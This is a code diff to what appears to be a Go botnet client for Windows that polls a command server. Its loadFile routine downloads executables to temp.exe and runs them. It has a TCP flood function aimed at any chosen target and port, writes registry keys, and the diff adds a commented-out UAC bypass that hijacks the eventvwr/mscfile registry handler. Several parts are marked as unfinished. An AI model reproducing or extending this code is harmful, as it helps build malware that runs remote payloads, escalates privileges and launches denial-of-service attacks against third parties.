@@ -12,8 +12,6 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
-	random "math/rand"
-	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -351,6 +349,9 @@ func getLoadURL(apiURL string, sessionKey string, id string, token string) strin
 	return result
 }
 
+// File downloaded but won't run
+// To be fixed
+
 func loadFile(apiURL string, sessionKey string, id string, token string, fileName string, fileURL string) {
 	client := &http.Client{}
 	req, _ := http.NewRequest("GET", fileURL, nil)
@@ -359,13 +360,13 @@ func loadFile(apiURL string, sessionKey string, id string, token string, fileNam
 	resp, err := client.Do(req)
 
 	if err == nil {
+		fmt.Println("Downloaded " + fileURL)
 		output, _ := os.Create(fileName)
 		defer output.Close()
 		defer resp.Body.Close()
 		io.Copy(output, resp.Body)
 
-		currentDir, _ := os.Getwd()
-		Exec := exec.Command("start " + currentDir + "\\" + fileName)
+		Exec := exec.Command(fileName)
 		err = Exec.Start()
 
 		if err != nil {
@@ -497,22 +498,78 @@ func bootRoutine(id string, token string, endTime time.Time, bootInstructions []
 	}
 }
 
+// To be used in the future
+
+// func randomString(strlen int, icint bool) string { //Generates a random string
+// 	if icint {
+// 		random.Seed(time.Now().UTC().UnixNano())
+// 		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
+// 		result := make([]byte, strlen)
+// 		for i := 0; i < strlen; i++ {
+// 			result[i] = chars[random.Intn(len(chars))]
+// 		}
+// 		return string(result)
+// 	}
+// 	random.Seed(time.Now().UTC().UnixNano())
+// 	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
+// 	result := make([]byte, strlen)
+// 	for i := 0; i < strlen; i++ {
+// 		result[i] = chars[random.Intn(len(chars))]
+// 	}
+// 	return string(result)
+// }
+
 func flood(target string, port string) {
-	connection, _ := net.Dial("tcp", target+":"+port)
-	fmt.Println(0)
-	random.Seed(time.Now().UTC().UnixNano())
-	connection.Write([]byte("test"))
-	connection.Close()
+	fmt.Println("Sent TCP packet at " + target + ":" + port)
+
+	// connection.Write panics with nil pointer derefrence
+	// to be fixed
+
+	// connection, _ := net.Dial("tcp", target+":"+port)
+	// random.Seed(time.Now().UTC().UnixNano())
+	// _, err := connection.Write([]byte(randomString(100, false)))
+
+	// if err != nil {
+	// 	fmt.Println(0)
+	// }
+
+	// connection.Close()
+
 }
+
+// To be used in the future
 
 // func amAdmin() bool {
 // 	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
 // 	return err == nil
 // }
 
+// func uacBypass(file string) bool {
+// 	Binary, _ := os.Create("temp.exe")
+// 	DecodedBinary, _ := base64.StdEncoding.DecodeString(file)
+// 	Binary.WriteString(string(DecodedBinary))
+// 	Binary.Close()
+// 	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKLM\\SOFTWARE\\Classes\\mscfile\\shell\\open\\command", "/d", "temp.exe")
+// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+// 	_, err := cmd.Output()
+// 	if err != nil {
+// 		return false
+// 	}
+// 	c := exec.Command("cmd", "/C", "eventvwr.exe")
+// 	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+// 	if err := c.Run(); err != nil {
+// 		return false
+// 	}
+// 	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKLM\\SOFTWARE\\Classes\\mscfile\\shell\\open\\command", "/f")
+// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+// 	_, err = cmd.Output()
+
+// 	return err == nil
+// }
+
 func addRegKey(regLocation registry.Key, regPath string, key string, value string) bool {
 	k, err := registry.OpenKey(regLocation, regPath, registry.QUERY_VALUE|registry.SET_VALUE)
-	
+
 	if err != nil {
 		log.Fatal(err)
 		return false
@@ -527,7 +584,7 @@ func addRegKey(regLocation registry.Key, regPath string, key string, value strin
 		log.Fatal(err)
 		return true
 	}
-	
+
 	return true
 }
 
@@ -556,7 +613,7 @@ func main() {
 	var bootFilePath string = appDataFolder + "\\boot.txt"     // This file keeps an id that tracks what boot instruction the client is executing
 	var configPath string = appDataFolder + "\\config.txt"     // This is where the client's credidentials are stored
 	var tempLoadFileName string = appDataFolder + "\\temp.exe" // This is the temporary file use for downloading and running executables
-	var apiURL string = "http://127.0.0.1:5332"                // The server's location
+	var apiURL string = "http://127.0.0.1:8080"                // The server's location
 
 	var apiConnection bool = checkConnection(apiURL)
 
